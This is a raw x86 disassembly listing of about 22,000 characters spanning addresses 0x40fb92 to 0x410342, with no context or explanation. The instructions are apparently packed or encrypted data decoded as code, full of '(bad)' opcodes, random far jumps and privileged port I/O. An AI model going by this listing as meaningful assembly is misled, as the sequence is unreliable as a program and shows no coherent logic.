  40fb92:	test   BYTE PTR [esi-0x1422573f],dh
  40fb98:	ss mov esi,0x40bfcc6a
  40fb9e:	cs jecxz 0x40fb66
  40fba1:	xchg   DWORD PTR [ecx+0x3f],ebx
  40fba4:	mov    eax,ds:0xcc336e02
  40fba9:	repnz push edx
  40fbab:	mov    ecx,0x5dba59ee
  40fbb0:	pop    esp
  40fbb1:	shl    dl,1
  40fbb3:	cmc    
  40fbb4:	rcr    BYTE PTR [eax-0x6e74eac7],cl
  40fbba:	sbb    al,BYTE PTR [edx+edi*2+0x728cbda]
  40fbc1:	(bad)  [ecx]
  40fbc3:	aam    0x80
  40fbc5:	cli    
  40fbc6:	mov    es,eax
  40fbc8:	out    0xc6,eax
  40fbca:	div    DWORD PTR [eax+0x4]
  40fbcd:	mov    bh,0x85
  40fbcf:	aad    0x98
  40fbd1:	xor    DWORD PTR [edx],ebp
  40fbd3:	aaa    
  40fbd4:	cli    
  40fbd5:	in     al,0x6a
  40fbd7:	or     eax,0x197daf04
  40fbdc:	lods   eax,DWORD PTR ds:[esi]
  40fbdd:	fidiv  WORD PTR [edi+0x128ec843]
  40fbe3:	xor    al,0xf
  40fbe5:	stc    
  40fbe6:	les    eax,FWORD PTR [edi-0x12bcecb2]
  40fbec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbed:	int    0x24
  40fbef:	cwde   
  40fbf0:	and    al,bh
  40fbf2:	(bad)  
  40fbf3:	jl     0x40fc5e
  40fbf5:	stc    
  40fbf6:	jp     0x40fba1
  40fbf8:	xor    eax,DWORD PTR [ebp+0x47210589]
  40fbfe:	dec    eax
  40fbff:	sbb    DWORD PTR [edi+0xefa0a59],0x64a75b88
  40fc09:	sub    BYTE PTR ds:0x20746e17,dh
  40fc0f:	push   ss
  40fc10:	mov    dl,0x9d
  40fc12:	loopne 0x40fc2c
  40fc14:	inc    ebp
  40fc15:	dec    edx
  40fc16:	jmp    0xf769:0xf1373c34
  40fc1d:	inc    edi
  40fc1e:	or     edx,DWORD PTR [edi-0x61]
  40fc21:	imul   ebx,DWORD PTR [edx-0x7a],0x55995641
  40fc28:	adc    DWORD PTR [edi],ebp
  40fc2a:	mov    dl,0x15
  40fc2c:	iret   
  40fc2d:	in     eax,dx
  40fc2e:	and    BYTE PTR [ecx-0x5],dh
  40fc31:	jmp    0xbc73b23d
  40fc36:	lds    eax,FWORD PTR [ecx-0x59]
  40fc39:	popa   
  40fc3a:	in     al,0xfd
  40fc3c:	cwde   
  40fc3d:	mov    dl,0xd3
  40fc3f:	inc    esi
  40fc40:	fidivr DWORD PTR [esi+ebp*1]
  40fc43:	ss ret 
  40fc45:	sbb    al,ah
  40fc47:	pop    ds
  40fc48:	mov    ds:0x4b76f665,eax
  40fc4d:	xchg   esi,eax
  40fc4e:	aas    
  40fc4f:	mov    bl,0x6d
  40fc51:	(bad)
  40fc55:	fisttp DWORD PTR [ebx+0x61]
  40fc58:	rcr    DWORD PTR [ecx-0xf],1
  40fc5b:	add    esp,DWORD PTR [ecx-0x5ea6c92c]
  40fc61:	mov    dl,0xea
  40fc63:	push   esp
  40fc64:	f2xm1  
  40fc66:	fs pop ds
  40fc68:	inc    edi
  40fc69:	pushf  
  40fc6a:	sub    al,BYTE PTR es:[ebx]
  40fc6d:	shl    DWORD PTR [edi+ebx*4+0x70a62074],0x45
  40fc75:	jmp    0x89c064a8
  40fc7a:	push   ecx
  40fc7b:	or     ecx,ebx
  40fc7d:	aam    0x6f
  40fc7f:	xchg   edx,eax
  40fc80:	repnz ins BYTE PTR es:[edi],dx
  40fc82:	ja     0x40fce3
  40fc84:	adc    DWORD PTR [ecx+eiz*2],edi
  40fc87:	pop    eax
  40fc88:	sti    
  40fc89:	aam    0xb0
  40fc8b:	pushf  
  40fc8c:	daa    
  40fc8d:	pop    eax
  40fc8e:	inc    BYTE PTR [eax-0x67b5204]
  40fc94:	dec    edx
  40fc95:	pop    edx
  40fc96:	outs   dx,DWORD PTR ds:[esi]
  40fc97:	push   0x2d46f23
  40fc9c:	mov    al,BYTE PTR [esi]
  40fc9e:	dec    esi
  40fc9f:	xor    eax,0x288b2178
  40fca4:	pop    eax
  40fca5:	xchg   esp,eax
  40fca6:	xchg   ebx,eax
  40fca7:	cli    
  40fca8:	jmp    0xc7d5:0xd4466a78
  40fcaf:	lea    edi,[esi-0x44]
  40fcb2:	cmp    eax,0x235a3f0a
  40fcb7:	sub    esp,edi
  40fcb9:	sbb    dl,bh
  40fcbb:	fadd   DWORD PTR [ebx]
  40fcbd:	or     al,0x17
  40fcbf:	neg    DWORD PTR [ebp+esi*4+0x2ba3029b]
  40fcc6:	shl    BYTE PTR [ebp+0x4],1
  40fcc9:	enter  0x2305,0x4f
  40fccd:	jns    0x40fc50
  40fccf:	push   ebx
  40fcd0:	adc    dl,bh
  40fcd2:	mov    WORD PTR [edx+0x24addbe7],ds
  40fcd8:	ret    0xf617
  40fcdb:	sbb    al,0x10
  40fcdd:	xor    DWORD PTR [esi],0x3a
  40fce0:	arpl   WORD PTR [esi+eiz*8-0x59976641],si
  40fce7:	call   0x57acd2cd
  40fcec:	out    0x18,eax
  40fcee:	adc    eax,0xacc39201
  40fcf3:	pop    ecx
  40fcf4:	popa   
  40fcf5:	fisubr WORD PTR gs:[ebp+edi*1-0x2c3e8f4a]
  40fcfd:	jne    0x40fc82
  40fcff:	mov    BYTE PTR [ecx+0x49],dh
  40fd02:	pop    es
  40fd03:	push   ss
  40fd04:	mov    ah,0xc2
  40fd06:	mov    edi,0xcf312da5
  40fd0b:	clc    
  40fd0c:	jmp    0x87a2:0xfb4dd34b
  40fd13:	push   ds
  40fd14:	or     esp,DWORD PTR [edi+eiz*8]
  40fd17:	inc    eax
  40fd18:	push   es
  40fd19:	mov    WORD PTR [ebx+esi*4],?
  40fd1c:	lods   eax,DWORD PTR ds:[esi]
  40fd1d:	pop    es
  40fd1e:	xor    DWORD PTR [eax],eax
  40fd20:	mov    ?,WORD PTR [ebx]
  40fd22:	mov    al,0x16
  40fd24:	and    cl,BYTE PTR [ebx+0xa]
  40fd27:	add    BYTE PTR [edi+0x27],bl
  40fd2a:	mov    ds:0x9c30a700,eax
  40fd2f:	mov    cs,WORD PTR [esi-0x38]
  40fd32:	ret    0xc8e9
  40fd35:	ja     0x40fcba
  40fd37:	push   0x63
  40fd39:	nop
  40fd3a:	fidiv  WORD PTR [eax]
  40fd3c:	sub    BYTE PTR [ecx-0x3ef1792b],bl
  40fd42:	(bad)  
  40fd43:	cmp    ebx,DWORD PTR [esi-0x31]
  40fd46:	sub    ah,bh
  40fd48:	inc    ebp
  40fd49:	js     0x40fdbd
  40fd4b:	push   0x2d
  40fd4d:	pusha  
  40fd4e:	sub    BYTE PTR [edx+0x4],ah
  40fd51:	fcom   QWORD PTR [esi-0x6ef38f83]
  40fd57:	repnz imul esp,DWORD PTR [edi+0x2fd1c540],0xfffffffa
  40fd5f:	jge    0x40fdba
  40fd61:	out    dx,eax
  40fd62:	sub    DWORD PTR [eax],esi
  40fd64:	jmp    0x40fd7b
  40fd66:	(bad)  
  40fd67:	in     al,dx
  40fd68:	sub    al,0x16
  40fd6a:	fs (bad) 
  40fd6d:	adc    edx,DWORD PTR [ecx+0x3a4ce7f9]
  40fd73:	cmc    
  40fd74:	adc    eax,DWORD PTR [edx]
  40fd76:	mov    WORD PTR [edi],?
  40fd78:	scas   eax,DWORD PTR es:[edi]
  40fd79:	xchg   ecx,eax
  40fd7a:	or     cl,BYTE PTR [edx-0x5d]
  40fd7d:	dec    esp
  40fd7e:	add    DWORD PTR [edi+ebx*8-0xe],0x6f571d63
  40fd86:	sub    cl,BYTE PTR [esi-0x5c]
  40fd89:	fbstp  TBYTE PTR ds:0xf7d661f7
  40fd8f:	fldl2t 
  40fd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd92:	loopne 0x40fdfb
  40fd94:	jne    0x40fdc6
  40fd96:	mov    esp,0xc96e7121
  40fd9b:	sahf   
  40fd9c:	jge    0x40fd3d
  40fd9e:	hlt    
  40fd9f:	adc    BYTE PTR [ecx+0x56],cl
  40fda2:	cmc    
  40fda3:	xor    edi,edi
  40fda5:	data16 sub bl,BYTE PTR [edx+0x3a]
  40fda9:	ins    BYTE PTR es:[edi],dx
  40fdaa:	jns    0x40fd32
  40fdac:	pusha  
  40fdad:	pop    es
  40fdae:	gs mov cl,0x34
  40fdb1:	adc    ebx,DWORD PTR [ebx]
  40fdb3:	mov    dh,0x17
  40fdb5:	cmc    
  40fdb6:	mov    WORD PTR [ebx+0x6b3e57f],?
  40fdbc:	dec    edx
  40fdbd:	pop    es
  40fdbe:	xor    ch,al
  40fdc0:	cld    
  40fdc1:	data16 aam 0xdb
  40fdc4:	cld    
  40fdc5:	popf   
  40fdc6:	xor    eax,0xdf3484a0
  40fdcb:	(bad)  
  40fdcc:	xor    al,0x4d
  40fdce:	pushf  
  40fdcf:	xchg   edx,eax
  40fdd0:	(bad)  
  40fdd1:	cli    
  40fdd2:	mov    esi,edx
  40fdd4:	js     0x40fe46
  40fdd6:	and    eax,0x765c30b4
  40fddb:	ret    0xa9a0
  40fdde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fddf:	jp     0x40fe3d
  40fde1:	data16 jl 0x40fe07
  40fde4:	and    dl,BYTE PTR [ebx-0x6c]
  40fde7:	sub    bl,ch
  40fde9:	fs in  al,dx
  40fdeb:	sub    DWORD PTR [esi-0x20],edi
  40fdee:	lods   eax,DWORD PTR ds:[esi]
  40fdef:	out    dx,eax
  40fdf0:	or     cl,bl
  40fdf2:	adc    ebp,DWORD PTR ds:[ebp-0x66]
  40fdf6:	push   esi
  40fdf7:	and    eax,0x4d3f301c
  40fdfc:	xchg   edi,eax
  40fdfd:	jno    0x40fdeb
  40fdff:	jmp    0xadb99741
  40fe04:	(bad)  
  40fe05:	(bad)  
  40fe06:	shr    DWORD PTR [edx+0x62],1
  40fe09:	xchg   ecx,eax
  40fe0a:	js     0x40fdc1
  40fe0c:	inc    esi
  40fe0d:	lock pop ecx
  40fe0f:	pop    eax
  40fe10:	xor    edx,esp
  40fe12:	mov    ecx,0xd5942ff2
  40fe17:	gs je  0x40fe25
  40fe1a:	loope  0x40fe58
  40fe1c:	mov    al,ds:0x1484447e
  40fe21:	mov    ebp,0x5b37bafe
  40fe26:	bound  esp,QWORD PTR [ebp-0x56]
  40fe29:	or     edx,ebp
  40fe2b:	das    
  40fe2c:	jg     0x40fe97
  40fe2e:	imul   BYTE PTR [ebp-0x3f660cf1]
  40fe34:	cmovb  ebp,DWORD PTR [ecx+eiz*8+0x74]
  40fe39:	pop    esi
  40fe3a:	xchg   esi,eax
  40fe3b:	push   ebp
  40fe3c:	dec    ebx
  40fe3d:	mov    ebx,0xf12cd8ef
  40fe42:	in     eax,dx
  40fe43:	std    
  40fe44:	es dec eax
  40fe46:	retf   
  40fe47:	inc    ebx
  40fe48:	dec    esi
  40fe49:	xchg   ecx,eax
  40fe4a:	jmp    0x519f:0x9a8e3e90
  40fe51:	stc    
  40fe52:	stos   BYTE PTR es:[edi],al
  40fe53:	shl    BYTE PTR [ebx+ebp*2-0x5a00180e],1
  40fe5a:	mov    al,0x76
  40fe5c:	fild   DWORD PTR [ebp+0x55]
  40fe5f:	repnz inc ebp
  40fe61:	mov    DWORD PTR [ebx-0x5a],edx
  40fe64:	sbb    DWORD PTR [ecx],ebp
  40fe66:	add    DWORD PTR [ebp+0xc],eax
  40fe69:	push   0xffffffcb
  40fe6b:	sub    edi,DWORD PTR ds:0xa046bc9
  40fe71:	shl    DWORD PTR [edi-0x2e],cl
  40fe74:	jb     0x40fdfa
  40fe76:	dec    esi
  40fe77:	push   ebp
  40fe78:	shl    DWORD PTR cs:[edi+0x663f27d2],cl
  40fe7f:	sub    edx,esi
  40fe81:	adc    BYTE PTR [eax-0x54],dl
  40fe84:	xor    DWORD PTR ds:0xb754028d,edx
  40fe8a:	adc    al,BYTE PTR [eax]
  40fe8c:	xor    DWORD PTR [ecx+0x2a],eax
  40fe8f:	dec    edi
  40fe90:	push   esi
  40fe91:	das    
  40fe92:	jecxz  0x40fefb
  40fe94:	xor    bl,al
  40fe96:	test   al,0xf8
  40fe98:	(bad)
  40fe9c:	(bad)  
  40fe9d:	ror    BYTE PTR [eax],1
  40fe9f:	pop    esi
  40fea0:	inc    ebx
  40fea1:	(bad)  
  40fea2:	fisub  DWORD PTR [ecx-0x62]
  40fea5:	int    0x42
  40fea7:	neg    edi
  40fea9:	das    
  40feaa:	mov    ?,WORD PTR [ecx]
  40feac:	std    
  40fead:	out    dx,eax
  40feae:	dec    esp
  40feaf:	sbb    eax,0x8f002cdb
  40feb4:	xlat   BYTE PTR ds:[ebx]
  40feb5:	mov    ecx,0xc093cbb3
  40feba:	ins    DWORD PTR es:[edi],dx
  40febb:	test   DWORD PTR [esi+0x4162e90b],eax
  40fec1:	into   
  40fec2:	dec    eax
  40fec3:	(bad)  
  40fec4:	ret    0x8024
  40fec7:	imul   esi,eax,0x46af9784
  40fecd:	aad    0x8d
  40fecf:	call   0x9397d018
  40fed4:	xor    ecx,DWORD PTR fs:0x8a2eac3c
  40fedb:	mov    BYTE PTR [ecx],0x96
  40fede:	pop    ss
  40fedf:	lock arpl cx,di
  40fee2:	xchg   BYTE PTR [esp+eiz*2-0x44],bh
  40fee6:	in     eax,0x71
  40fee8:	jle    0x40feda
  40feea:	(bad)  
  40feeb:	fs hlt 
  40feed:	sahf   
  40feee:	add    DWORD PTR [esi+0x1],ebp
  40fef1:	aad    0xda
  40fef3:	mov    bl,0x8e
  40fef5:	cli    
  40fef6:	mov    eax,ds:0x78536918
  40fefb:	aad    0xf7
  40fefd:	or     DWORD PTR [edx+0x945334f],ecx
  40ff03:	sub    DWORD PTR [esp+edi*2-0x7f],esp
  40ff07:	jge    0x40ff6c
  40ff09:	enter  0xf077,0xc9
  40ff0d:	inc    esp
  40ff0e:	push   edi
  40ff0f:	and    eax,DWORD PTR [esi-0x372cd676]
  40ff15:	bound  ebp,QWORD PTR [edi]
  40ff17:	retf   
  40ff18:	push   edx
  40ff19:	adc    dl,dl
  40ff1b:	sbb    al,0x7a
  40ff1d:	mov    eax,0x41ab6e78
  40ff22:	nop
  40ff23:	fwait
  40ff24:	push   ebp
  40ff25:	sub    ax,0x3ccf
  40ff29:	jmp    0xe22d:0xd897fddf
  40ff30:	pop    ecx
  40ff31:	xchg   ebx,eax
  40ff32:	mov    DWORD PTR [edi-0x678abe70],esi
  40ff38:	retf   0x7131
  40ff3b:	jmp    0x73f7:0xdcfd79e0
  40ff42:	int    0xc0
  40ff44:	xchg   esi,eax
  40ff45:	mov    cl,0xfb
  40ff47:	xchg   BYTE PTR [edi],ah
  40ff49:	mov    edx,0x32ecbf60
  40ff4e:	xor    DWORD PTR [ecx+0x7],edx
  40ff51:	sahf   
  40ff52:	mov    eax,ds:0x7eb97c2
  40ff57:	push   0x28
  40ff59:	cdq    
  40ff5a:	inc    eax
  40ff5b:	loope  0x40ff5d
  40ff5d:	dec    edx
  40ff5e:	inc    eax
  40ff5f:	mov    eax,ds:0xc238fda8
  40ff64:	outs   dx,BYTE PTR ds:[esi]
  40ff65:	repz cwde 
  40ff67:	or     eax,0x7e2c943d
  40ff6c:	sub    edx,DWORD PTR [ebx+esi*4+0x5b313e72]
  40ff73:	mov    eax,DWORD PTR [eax]
  40ff75:	pop    eax
  40ff76:	xor    ebx,0x3e
  40ff79:	imul   DWORD PTR [ecx+0x2aff9a3f]
  40ff7f:	mov    dl,0xb5
  40ff81:	jo     0x40ffa6
  40ff83:	lock inc ecx
  40ff85:	icebp  
  40ff86:	mov    ch,0x29
  40ff88:	loope  0x40ff28
  40ff8a:	or     eax,0xc8c757a6
  40ff8f:	pushf  
  40ff90:	std    
  40ff91:	cmc    
  40ff92:	or     DWORD PTR [ebp-0x519d75c],eax
  40ff98:	(bad)  
  40ff99:	loope  0x40ff43
  40ff9b:	adc    DWORD PTR [esi],ecx
  40ff9d:	pop    esp
  40ff9e:	push   0x57667034
  40ffa3:	and    BYTE PTR [ebp+edx*1-0x3dd3b546],0x89
  40ffab:	adc    al,0x3c
  40ffad:	mov    ebp,0xa6b7f9b0
  40ffb2:	xchg   edi,eax
  40ffb3:	not    BYTE PTR [ebp-0x4d]
  40ffb6:	sbb    eax,0xf79aa08b
  40ffbb:	jmp    0x6cff:0xe89e9f4c
  40ffc2:	popf   
  40ffc3:	pop    ecx
  40ffc4:	mov    al,0x62
  40ffc6:	and    ebx,DWORD PTR [eax-0x7b]
  40ffc9:	sbb    eax,0xd90f0488
  40ffce:	inc    eax
  40ffcf:	mov    esi,0x6af776b5
  40ffd4:	ss xor ax,0x7d
  40ffd9:	cmp    eax,DWORD PTR [edx]
  40ffdb:	mov    bh,0xaa
  40ffdd:	daa    
  40ffde:	adc    eax,DWORD PTR [eax+0x18]
  40ffe1:	push   eax
  40ffe2:	popf   
  40ffe3:	jmp    0x6cf7:0x7da14932
  40ffea:	fistp  DWORD PTR [edx+0x4493a613]
  40fff0:	out    dx,al
  40fff1:	or     eax,0x69d001a3
  40fff6:	cmp    edx,0xffffffaf
  40fff9:	cs pop esp
  40fffb:	sbb    eax,0xbba5bebb
  410000:	sbb    BYTE PTR [eax],dl
  410002:	nop
  410003:	sbb    al,0xb5
  410005:	cmp    eax,0x39b589d5
  41000a:	cmp    ebx,edx
  41000c:	mov    ds:0x8858210b,eax
  410011:	push   esi
  410012:	inc    esi
  410013:	adc    bh,BYTE PTR [eax-0x54]
  410016:	mov    BYTE PTR [esi-0x4099dd57],ch
  41001c:	add    al,0xe8
  41001e:	push   ds
  41001f:	push   ds
  410020:	xchg   ecx,eax
  410021:	repz xchg esp,eax
  410023:	xchg   ecx,eax
  410024:	mov    ah,0xc5
  410026:	xchg   esp,eax
  410027:	mov    dl,0xaf
  410029:	es mov ah,0xe3
  41002c:	popa   
  41002d:	jns    0x410075
  41002f:	sbb    edi,edi
  410031:	push   es
  410032:	rol    DWORD PTR [edi+0x1a],cl
  410035:	pop    eax
  410036:	scas   al,BYTE PTR es:[di]
  410038:	xchg   ebx,eax
  410039:	push   esi
  41003a:	je     0x40ffd2
  41003c:	inc    edi
  41003d:	clc    
  41003e:	cli    
  41003f:	and    BYTE PTR [ecx+0x2540b3e],bl
  410045:	mov    dh,0xe5
  410047:	inc    esi
  410048:	imul   edi,DWORD PTR [edi+0x44],0x53cec0ca
  41004f:	call   0xf81e3ecc
  410054:	in     eax,0x8
  410056:	jno    0x41009d
  410058:	aad    0xec
  41005a:	mov    dl,0xc8
  41005c:	in     al,0x35
  41005e:	mov    ch,0xdb
  410060:	pop    eax
  410061:	rol    DWORD PTR [eax+0x40631f5b],1
  410067:	int    0x33
  410069:	push   edi
  41006a:	fstp   TBYTE PTR [bp+0x146d]
  41006f:	xor    al,BYTE PTR [esi]
  410071:	pop    ebx
  410072:	fdiv   st,st(4)
  410074:	fcomp  QWORD PTR [ebx+eax*1+0x630d6e90]
  41007b:	mov    cl,0xd2
  41007d:	sbb    DWORD PTR [ebx+0x41d39c74],edx
  410083:	mov    ebx,0x78e0be53
  410088:	mov    bl,0xc2
  41008a:	dec    edi
  41008b:	xchg   BYTE PTR [edi-0x27228f39],bl
  410091:	stos   BYTE PTR es:[edi],al
  410092:	push   ss
  410093:	les    ebx,FWORD PTR [esp+eiz*4+0x48]
  410097:	jbe    0x4100e1
  410099:	(bad)
  41009d:	ds and esp,eax
  4100a0:	jmp    0x2c7d:0x4416801a
  4100a7:	mov    BYTE PTR [ebx+0x47],bh
  4100aa:	push   ebx
  4100ab:	adc    BYTE PTR ds:0xb28d83df,cl
  4100b1:	pop    ss
  4100b2:	mov    bl,0x92
  4100b4:	add    BYTE PTR [ebp+0x7d],al
  4100b7:	inc    eax
  4100b8:	shl    bh,1
  4100ba:	leave  
  4100bb:	sbb    BYTE PTR [eax],0xa0
  4100be:	jle    0x4100cd
  4100c0:	int3   
  4100c1:	call   0x1665:0xca97a8a4
  4100c8:	jnp    0x4100d0
  4100ca:	jae    0x4100f1
  4100cc:	cmp    ebx,DWORD PTR [eax+esi*4+0x11]
  4100d0:	dec    edi
  4100d1:	outs   dx,BYTE PTR ds:[esi]
  4100d2:	dec    ebx
  4100d3:	jb     0x41006f
  4100d5:	pop    ss
  4100d6:	lock push eax
  4100d8:	adc    eax,0x30302a2b
  4100dd:	retf   
  4100de:	je     0x410148
  4100e0:	sbb    ecx,0x1
  4100e3:	and    eax,0xd52f026e
  4100e8:	out    dx,al
  4100e9:	xchg   edx,esp
  4100eb:	cs in  eax,dx
  4100ed:	arpl   WORD PTR [esi-0x5a],bx
  4100f0:	sub    ecx,DWORD PTR [ebx+ebp*4-0x6d3b54b6]
  4100f7:	pop    ebx
  4100f8:	mov    ss,WORD PTR [ebx]
  4100fa:	mov    ebx,0x75189ac8
  4100ff:	enter  0x9e34,0xa5
  410103:	adc    al,0xd2
  410105:	cmp    DWORD PTR [eax+0x7a2a5709],ebp
  41010b:	(bad)  
  41010c:	int3   
  41010d:	or     eax,0x50a9c34b
  410112:	pop    ds
  410113:	inc    edi
  410114:	lea    esi,[eax-0x45b60e4e]
  41011a:	push   esp
  41011b:	mov    ds:0xc4c519a5,eax
  410120:	pop    edi
  410121:	jmp    0x419d:0x2614f26
  410128:	mov    bh,0x8b
  41012a:	xchg   edi,eax
  41012b:	add    eax,0x9a8252f4
  410130:	out    0x95,al
  410132:	pop    ecx
  410133:	cmp    DWORD PTR [ecx],edx
  410135:	push   0x2f5f660e
  41013a:	popf   
  41013b:	stc    
  41013c:	fld    DWORD PTR [ebp+eax*8-0x21]
  410140:	int    0x0
  410142:	in     al,0x78
  410144:	jl     0x4100fe
  410146:	fild   DWORD PTR [ebp+0x4c]
  410149:	and    al,0x66
  41014b:	add    al,0x8c
  41014d:	add    esp,ebx
  41014f:	xor    al,0xa8
  410151:	or     al,BYTE PTR [edi]
  410153:	das    
  410154:	ss aad 0x66
  410157:	jg     0x410181
  410159:	sbb    edi,DWORD PTR [eax]
  41015b:	outs   dx,DWORD PTR ds:[esi]
  41015c:	outs   dx,DWORD PTR ds:[esi]
  41015d:	shl    DWORD PTR [edi],cl
  41015f:	dec    esp
  410160:	out    0x68,eax
  410162:	mov    WORD PTR [esi-0x26],?
  410165:	cmp    BYTE PTR [ebp+0x1f455f2e],0x1a
  41016c:	push   ss
  41016d:	xor    eax,DWORD PTR [edx]
  41016f:	pop    ebp
  410170:	sub    BYTE PTR [esi+0x0],ch
  410173:	or     al,0x66
  410175:	jmp    0x48a9778
  41017a:	mov    eax,ds:0x856b280d
  41017f:	popf   
  410180:	(bad)  
  410182:	fsubr  st,st(7)
  410184:	jl     0x410133
  410186:	inc    ecx
  410187:	pop    edx
  410188:	sub    cl,dl
  41018a:	mov    ds:0xf90b71d,al
  41018f:	sbb    BYTE PTR [eax+edi*4],0x4
  410193:	or     edx,eax
  410195:	xor    esi,DWORD PTR [esp+eax*4-0x79]
  410199:	loope  0x4101d5
  41019b:	sub    BYTE PTR [esi+0x74],ah
  41019e:	scas   al,BYTE PTR es:[edi]
  41019f:	dec    ebx
  4101a0:	outs   dx,DWORD PTR es:[esi]
  4101a2:	dec    esi
  4101a3:	adc    ch,BYTE PTR ds:0xeb2e3c61
  4101a9:	adc    BYTE PTR [edi+0x5f],dh
  4101ac:	fnstenv [esi]
  4101ae:	bound  ecx,QWORD PTR [esi-0x4d]
  4101b1:	cmp    eax,0x19843395
  4101b6:	push   esp
  4101b7:	push   edx
  4101b8:	leave  
  4101b9:	loop   0x410225
  4101bb:	sbb    eax,0x176e4d47
  4101c0:	out    0xb1,al
  4101c2:	cmc    
  4101c3:	stos   DWORD PTR es:[edi],eax
  4101c4:	add    esi,DWORD PTR [ebx+0x11]
  4101c7:	xchg   edi,eax
  4101c8:	sub    cl,0xe3
  4101cb:	ror    ch,cl
  4101cd:	add    ecx,DWORD PTR [esi-0xdf8bf21]
  4101d3:	push   es
  4101d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101d5:	xor    BYTE PTR [esi],al
  4101d7:	aaa    
  4101d8:	test   eax,0x65e07d47
  4101dd:	or     al,0x29
  4101df:	ret    0x20c9
  4101e2:	add    BYTE PTR [edi+edi*2],dl
  4101e5:	sub    al,0xba
  4101e7:	and    al,0x59
  4101e9:	cdq    
  4101ea:	jmp    0x410221
  4101ec:	fld    DWORD PTR [edi+0xd]
  4101ef:	jnp    0x410197
  4101f1:	call   0xf142:0x4b84f8fd
  4101f8:	nop
  4101f9:	pop    ds
  4101fa:	and    al,0x3
  4101fc:	not    DWORD PTR [eax+0x28]
  4101ff:	(bad)  
  410200:	aam    0xf1
  410202:	xor    BYTE PTR ds:0x69783947,dl
  410208:	sub    ch,BYTE PTR [esi-0x3b4695d6]
  41020e:	div    DWORD PTR [edx]
  410210:	dec    edx
  410211:	sub    dh,BYTE PTR [edx]
  410213:	in     eax,dx
  410214:	cwde   
  410215:	add    bh,ah
  410217:	arpl   ax,dx
  410219:	mov    eax,0x7d66ee7e
  41021e:	cmp    al,0xd2
  410220:	push   ebx
  410221:	push   esp
  410222:	mov    al,BYTE PTR [eax+0x5b]
  410225:	fwait
  410226:	mov    es,WORD PTR [edi-0xabe85dd]
  41022c:	pop    edx
  41022d:	dec    edi
  41022e:	(bad)  
  410230:	pop    ebx
  410231:	inc    eax
  410232:	dec    ebp
  410233:	into   
  410234:	lock bound ebp,QWORD PTR [esi]
  410237:	enter  0xcc13,0x49
  41023b:	bound  ebx,QWORD PTR [eax-0x30]
  41023e:	dec    ebx
  41023f:	(bad)  
  410241:	shr    BYTE PTR [esi+0x24],0xa8
  410245:	push   ds
  410246:	pushf  
  410247:	gs or  al,0xff
  41024a:	jae    0x41026f
  41024c:	jbe    0x410278
  41024e:	mov    edi,0xfdcfd79e
  410253:	push   edi
  410254:	pop    ecx
  410255:	mov    ah,0xca
  410257:	ins    BYTE PTR es:[edi],dx
  410258:	lea    ebx,[esi]
  41025a:	das    
  41025b:	xchg   edx,eax
  41025c:	push   edi
  41025d:	sti    
  41025e:	lods   al,BYTE PTR ds:[esi]
  41025f:	pop    es
  410260:	pushf  
  410261:	and    BYTE PTR [ecx],0x4d
  410264:	cld    
  410265:	(bad)  
  410266:	and    BYTE PTR [esi],bl
  410268:	mov    dl,0xc2
  41026a:	sbb    dl,ch
  41026c:	js     0x41027a
  41026e:	adc    eax,0x42a903f1
  410273:	and    bl,bl
  410275:	mov    esi,0x3e0ed351
  41027a:	sar    DWORD PTR [esi+0x1c],1
  41027d:	adc    eax,0xb91de653
  410282:	mov    edi,0x208cdd83
  410287:	jmp    0x41028a
  410289:	in     eax,dx
  41028a:	mov    ebp,0xd372c28
  41028f:	rcl    edi,0x7e
  410292:	retf   
  410293:	push   edx
  410294:	sbb    DWORD PTR [esi],ebp
  410296:	loope  0x41022a
  410298:	push   ebx
  410299:	add    al,BYTE PTR [eax+0x1a]
  41029c:	movntq QWORD PTR [ecx+0x27ff2ad6],mm5
  4102a3:	fwait
  4102a4:	adc    eax,0xe0a56af8
  4102a9:	stos   BYTE PTR es:[edi],al
  4102aa:	sahf   
  4102ab:	cwde   
  4102ac:	add    DWORD PTR [edx],esi
  4102ae:	push   0x1a1026e5
  4102b3:	mov    ebx,0xe7f63a91
  4102b8:	xlat   BYTE PTR ds:[ebx]
  4102b9:	pop    edi
  4102ba:	dec    esi
  4102bb:	add    esi,ecx
  4102bd:	fnsetpm(287 only) 
  4102bf:	mov    eax,ebp
  4102c1:	jl     0x4102ad
  4102c3:	mov    ?,WORD PTR [esi-0xa]
  4102c6:	adc    DWORD PTR [eax-0x16],edi
  4102c9:	sub    ebx,0x9
  4102cc:	dec    edx
  4102cd:	loop   0x410284
  4102cf:	mov    bl,0x12
  4102d1:	ret    0x37a7
  4102d4:	mul    BYTE PTR [edx+0x46]
  4102d7:	pop    ss
  4102d8:	sub    ah,ah
  4102da:	jns    0x410276
  4102dc:	test   al,0xc7
  4102de:	xchg   ch,al
  4102e0:	rcr    DWORD PTR [ebp+0x16660e2d],cl
  4102e6:	ret    
  4102e7:	arpl   WORD PTR [edx+0x50c1cc8],di
  4102ed:	cmp    ch,dl
  4102ef:	push   ecx
  4102f0:	retf   
  4102f1:	mov    dh,0xa3
  4102f3:	fs mov ebp,0xb1456e8
  4102f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102fa:	(bad)  
  4102fb:	outs   dx,DWORD PTR ds:[esi]
  4102fc:	aam    0x84
  4102fe:	inc    esp
  4102ff:	ret    0x9d00
  410302:	inc    esi
  410303:	xchg   edi,eax
  410304:	xchg   edi,eax
  410305:	ins    BYTE PTR es:[edi],dx
  410306:	arpl   si,di
  410308:	or     esp,DWORD PTR [eax]
  41030a:	dec    DWORD PTR [ecx-0x45]
  41030d:	out    dx,al
  41030e:	jp     0x41038f
  410310:	xor    BYTE PTR [edi],bl
  410312:	and    ebp,edi
  410314:	inc    edi
  410315:	mov    ds:0x794956a1,al
  41031a:	jg     0x4102fc
  41031c:	mov    edx,DWORD PTR [edx]
  41031e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41031f:	pop    esi
  410320:	mov    ah,0x3b
  410322:	jo     0x410335
  410324:	or     DWORD PTR [ebp+0x30],0x7ad6f031
  41032b:	push   ebx
  41032c:	outs   dx,DWORD PTR ds:[esi]
  41032d:	jns    0x4102b0
  41032f:	or     esi,edi
  410331:	xchg   edx,eax
  410332:	mov    ebx,0xf89150de
  410337:	mov    edx,0x291c0a18
  41033c:	mov    ch,0x86
  41033e:	cmp    al,0x4e
  410340:	loop   0x4102db
  410342:	mov    edi,0xafbe292d
